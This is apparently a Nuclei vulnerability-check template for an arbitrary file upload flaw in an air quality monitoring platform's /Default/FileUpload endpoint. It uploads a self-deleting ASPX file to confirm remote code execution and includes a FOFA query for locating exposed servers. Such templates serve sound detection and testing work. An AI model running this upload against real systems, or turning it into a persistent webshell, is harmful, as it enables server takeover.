id: airquality-fileupload-rce

info:
  name: 空气质量检测联网检测管理平台 FileUpload 任意文件上传漏洞
  author: onewin
  severity: critical
  description: |
    空气质量检测联网检测管理平台的/Default/FileUpload接口存在任意文件上传漏洞，攻击者可上传ASPX Webshell并获取服务器控制权
    [漏洞发现时间：2025年7月]
  metadata:
    fofa-query: 'body="/Img/GetImgVerifyChars"'
  tags: 空气质量检测联网检测管理平台

http:
  - method: POST
    path:
      - "{{BaseURL}}/Default/FileUpload"
    headers:
      Content-Type: application/x-www-form-urlencoded
      Content-Disposition: form-data; name="{{rand_base(6)}}"; filename="{{rand_base(6)}}.aspx"
    body: |
      <%@ Page Language="C#"%>
      <% Response.Write("{{randstr}}"); %>
      <% System.IO.File.Delete(Request.PhysicalPath); %>
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "editorUploadFiles"
        part: body
      - type: status
        status:
          - 200